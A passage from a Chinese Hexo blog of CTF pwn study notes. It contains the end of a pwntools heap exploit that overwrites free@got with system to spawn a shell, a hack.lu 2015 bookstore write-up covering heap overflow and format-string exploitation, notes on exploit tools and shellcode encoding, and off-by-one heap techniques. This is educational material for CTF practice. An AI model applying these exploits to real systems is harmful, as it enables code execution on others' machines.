p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">&#x27;free&#x27;</span>]))  <span class="comment">#1</span></span><br><span class="line"><span class="comment"># leak freeaddr</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment"># overwrite free@got with system addr</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"><span class="comment"># trigger system(&quot;/bin/sh&quot;)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/2015_hacklu_bookstore">题目链接</a></p>
<h3 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  2015_hacklu_bookstore git:(master) file books    </span><br><span class="line">books: ELF <span class="number">64</span>-bit LSB executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped</span><br><span class="line">➜  2015_hacklu_bookstore git:(master) checksec books    </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/2015_hacklu_bookstore/books&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>

<p>可以看出该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护。</p>
<h3 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h3><p>该程序的主要功能是订书，具体如下</p>
<ul>
<li>最多可以订购两本书。</li>
<li>根据编号来选择订购第几本书，可以为每本书添加对应的名字。然而在添加名字处出现了任意长度堆溢出的漏洞。</li>
<li>根据编号来删除 order，但是这里只是单纯地 free 掉，并没有置为 NULL，因此会出现 use after free 的漏洞。</li>
<li>提交订单，将两本书的名字合在一起。这里由于上面堆溢出的问题，这里也会出现堆溢出的漏洞。</li>
<li>此外，在程序退出之前存在一个<strong>格式化字符串漏洞</strong>。</li>
</ul>
<p>这里虽然程序的漏洞能力很强，但是所有进行 malloc 的大小都是完全固定的，我们只能借助这些分配的 chunk 来进行操作。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>程序中主要的漏洞在于堆溢出和格式化字符串漏洞，但是如果想要利用格式化字符串漏洞，必然需要溢出对应的 dest 数组。具体思路如下</p>
<ol>
<li>利用堆溢出进行 chunk extend，使得在 submit 中 时，恰好返回第二个订单处的位置。在 submit 之前，布置好堆内存布局，使得把字符串拼接后恰好可以覆盖 dest 为指定的格式化字符串。<code>malloc(0x140uLL)</code></li>
<li>通过构造 dest 为指定的格式化字符串：一方面泄漏 __libc_start_main_ret 的地址，<strong>一方面控制程序重新返回执行</strong>。这时，便可以知道 libc 基地址，system 等地址。需要注意的是由于一旦 submit 之后，程序就会直接直接退出，所以我们比较好的思路就是修改 fini_array 中的变量，以便于达到程序执行完毕后，<strong>重新返回我们期待的位置</strong>。这里我们会使用一个 trick，程序每次读取选择的时候会读取 128 大小，在栈上。而程序最后在输出 dest 的时候，之前所读取的那部分选择必然是在栈上的，所以我们如果我们在栈上预先布置好一些控制流指针，那就可以来控制程序的执行流程。</li>
<li>再次利用格式化字符串漏洞，覆盖 free@got 为 system 地址，从而达到任意命令执行的目的。</li>
</ol>
<p>这里，各个参数的偏移是</p>
<ul>
<li>Fini_array0 : 5+8&#x3D;13</li>
<li>__libc_start_main_ret : 5+0x1a&#x3D;31。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp  0x7ffe6a7f3ec8 —▸ 0x400c93 ◂— mov    eax, 0</span><br><span class="line">01:0008│      0x7ffe6a7f3ed0 ◂— 0x100000000</span><br><span class="line">02:0010│      0x7ffe6a7f3ed8 —▸ 0x9f20a0 ◂— 0x3a3120726564724f (&#x27;Order 1:&#x27;)</span><br><span class="line">03:0018│      0x7ffe6a7f3ee0 —▸ 0x400d38 ◂— pop    rcx</span><br><span class="line">04:0020│      0x7ffe6a7f3ee8 —▸ 0x9f2010 ◂— 0x6666666666667325 (&#x27;%sffffff&#x27;)</span><br><span class="line">05:0028│      0x7ffe6a7f3ef0 —▸ 0x9f20a0 ◂— 0x3a3120726564724f (&#x27;Order 1:&#x27;)</span><br><span class="line">06:0030│      0x7ffe6a7f3ef8 —▸ 0x9f2130 ◂— 0x6564724f203a3220 (&#x27; 2: Orde&#x27;)</span><br><span class="line">07:0038│      0x7ffe6a7f3f00 ◂— 0xa35 /* &#x27;5\n&#x27; */</span><br><span class="line">08:0040│      0x7ffe6a7f3f08 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0b:0058│      0x7ffe6a7f3f20 ◂— 0xff00000000000000</span><br><span class="line">0c:0060│      0x7ffe6a7f3f28 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0f:0078│      0x7ffe6a7f3f40 ◂— 0x5f5f00656d697474 /* &#x27;ttime&#x27; */</span><br><span class="line">10:0080│      0x7ffe6a7f3f48 ◂— 0x7465675f6f736476 (&#x27;vdso_get&#x27;)</span><br><span class="line">11:0088│      0x7ffe6a7f3f50 ◂— 0x1</span><br><span class="line">12:0090│      0x7ffe6a7f3f58 —▸ 0x400cfd ◂— add    rbx, 1</span><br><span class="line">13:0098│      0x7ffe6a7f3f60 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">15:00a8│      0x7ffe6a7f3f70 —▸ 0x400cb0 ◂— push   r15</span><br><span class="line">16:00b0│      0x7ffe6a7f3f78 —▸ 0x400780 ◂— xor    ebp, ebp</span><br><span class="line">17:00b8│      0x7ffe6a7f3f80 —▸ 0x7ffe6a7f4070 ◂— 0x1</span><br><span class="line">18:00c0│      0x7ffe6a7f3f88 ◂— 0xd8d379f22453ff00</span><br><span class="line">19:00c8│ rbp  0x7ffe6a7f3f90 —▸ 0x400cb0 ◂— push   r15</span><br><span class="line">1a:00d0│      0x7ffe6a7f3f98 —▸ 0x7f9db2113830 (__libc_start_main+240) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/23/%E5%B7%A5%E5%85%B7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/23/%E5%B7%A5%E5%85%B7/" class="post-title-link" itemprop="url">工具</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-23 22:38:45" itemprop="dateCreated datePublished" datetime="2024-10-23T22:38:45+08:00">2024-10-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-24 22:16:20" itemprop="dateModified" datetime="2024-11-24T22:16:20+08:00">2024-11-24</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本篇主要更新pwn过程中使用的工具及其使用方法，功能不做赘述。</p>
<hr>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a><strong>pwntools</strong></h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 网址，端口号<span class="comment">#连接网站</span></span><br></pre></td></tr></table></figure>

<p>几乎用于很简单的pwn题或直接连接靶机做题</p>
<hr>
<h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>

<p>用于查找代码中对应的汇编命令的地址</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;/sh&#x27;</span></span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;sh&#x27;</span></span><br><span class="line"></span><br><span class="line">ROPgadget --binary 文件名 --string <span class="string">&#x27;cat flag&#x27;</span></span><br><span class="line"></span><br><span class="line"> ROPgadget --binary 文件名 --string <span class="string">&#x27;cat flag.txt&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>用于查找代码中对应的getshell命令字符或关于flag的指令</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --ropchain</span><br></pre></td></tr></table></figure>

<p>生成现成的ropchain，可以直接实现getshell（静态，且要求文件使用gets函数读取，因为静态链较长，一般无法缩短过多）</p>
<hr>
<h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>修改ld（我一般会将下载的放置在题目文件夹，否则需要相对路径）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter 版本号/ld-linux.so<span class="number">.2</span> ./文件名</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --<span class="built_in">set</span>-interpreter <span class="number">2.23</span>-0ubuntu3_amd64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span> ./pwn</span><br></pre></td></tr></table></figure>

<p>修改libc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so<span class="number">.6</span>  ./（路径）/libc.so<span class="number">.6</span> ./pwn</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so<span class="number">.6</span> ./libc.so<span class="number">.6</span> ./pwn</span><br></pre></td></tr></table></figure>

<p>添加libc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --add-needed 版本号/libc.so<span class="number">.6</span> ./文件名</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">patchelf --add-needed <span class="number">2.23</span>-0ubuntu3_amd64/libc.so<span class="number">.6</span> ./pwn</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>补充常用的libc版本</p>
<blockquote>
<p>2.23-0ubuntu11.3_amd64<br>2.27-3ubuntu1.5_amd64</p>
</blockquote>
<hr>
<h2 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h2><p>与ROPgadget类似，静态链用法</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary pwn --ropchain//一般生成较长，可人为缩减</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc all in one"></a>glibc all in one</h1><h4 id="一般情况"><a href="#一般情况" class="headerlink" title="一般情况"></a>一般情况</h4><p>先展出所有libc列表</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">list</span></span><br></pre></td></tr></table></figure>

<p>下载所需要的glibc版本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./download 版本号  <span class="comment">#下载所需版本</span></span><br></pre></td></tr></table></figure>

<h4 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h4><p>展出老版本列表</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat old_list</span><br></pre></td></tr></table></figure>

<p>下载老版本列表</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./download_old 版本号</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先后顺序搞清楚，下载后移到题目文件夹，方便搭建环境</p>
<hr>
<h1 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h1><p>开了PIE</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0x相对基址偏移)  //下断点下到特定地址</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a><strong>alpha3</strong></h2><p>主要用于shellcode修改为题目的可见字符（使用alpha3进行编码shellcode，生成一段没有坏字符的shellcode。然后使用jmp esp进行shellcode注入。）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd alpha3</span><br><span class="line">python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;存储shellcode的文件&quot; &gt; 输出文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/21/off-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/21/off-by-one/" class="post-title-link" itemprop="url">off-by-one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-10-21 22:14:10" itemprop="dateCreated datePublished" datetime="2024-10-21T22:14:10+08:00">2024-10-21</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-20 20:24:48" itemprop="dateModified" datetime="2024-11-20T20:24:48+08:00">2024-11-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="off-by-one-利用思路"><a href="#off-by-one-利用思路" class="headerlink" title="off-by-one 利用思路"></a>off-by-one 利用思路</h2><ol>
<li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li>
<li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 是否一致。</li>
</ol>
<p>最新版本代码中，已加入针对 2 中后一种方法的 check ，但是在 2.28 及之前版本并没有该 check 。</p>
<p> for 循环的边界没有控制好导致写入多执行了一次，这也被称为栅栏错误</p>
<p>数据发生了溢出覆盖到了下一个堆块的 prev_size 域 print ‘A’*17</p>
<p>strlen 和 strcpy 的行为不一致却导致了 off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。这就导致了我们向 chunk1 中写入了 25 个字节，我们使用 gdb 进行调试可以看到这一点。</p>
<p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。 还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的 CPU 的字节序都是小端法的，比如一个 DWORD 值在使用小端法的内存中是这样储存的</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/20/pwntools%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/10/20/pwntools%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/" class="post-title-link" itemprop="url">pwntools常用函数</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-10-20 19:16:57 / 修改时间：19:17:33" itemprop="dateCreated datePublished" datetime="2024-10-20T19:16:57+08:00">2024-10-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><code>flat([cyclic(0x50), passwd_addr + 0x4])</code>以下是对这一行代码的解析：</p>
<h3 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h3><ol>
<li><strong><code>cyclic(0x50)</code></strong>:<ul>
<li><code>cyclic</code> 是 <code>pwntools</code> 中的一个函数，用于生成一个长度为 0x50（即 80 字节）的循环模式字符串。这个字符串通常用于缓冲区溢出攻击中，以便在后续的溢出过程中更容易地识别栈的偏移量。</li>
<li>例如，它可能生成一个像 <code>abcdeabcdeabcde...</code> 的模式，以帮助开发者确定输入数据中某个特定点的偏移量。</li>
</ul>
</li>
<li><strong><code>passwd_addr + 0x4</code></strong>:<ul>
<li><code>passwd_addr</code> 代表一个变量，通常是某个内存地址，可能是程序中存储密码的地方。</li>
<li><code>+ 0x4</code> 表示在这个地址的基础上偏移 4 字节。这可能是因为你想访问该地址后面的数据，比如一个指针或某个结构体的字段。</li>
</ul>
</li>
<li><strong><code>flat([...])</code></strong>:<ul>
<li><code>flat</code> 是 <code>pwntools</code> 提供的另一个函数，用于将传入的列表展平为一个连续的字节串。它会将列表中的元素（比如字节串、整数等）按顺序组合成一个连续的内存块。</li>
<li>在这个上下文中，<code>flat</code> 会将 <code>cyclic(0x50)</code> 生成的字节串和 <code>passwd_addr + 0x4</code> 的值（通常是以字节形式表示的内存地址）连接在一起，形成一个最终的输入数据。</li>
</ul>
</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">48</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
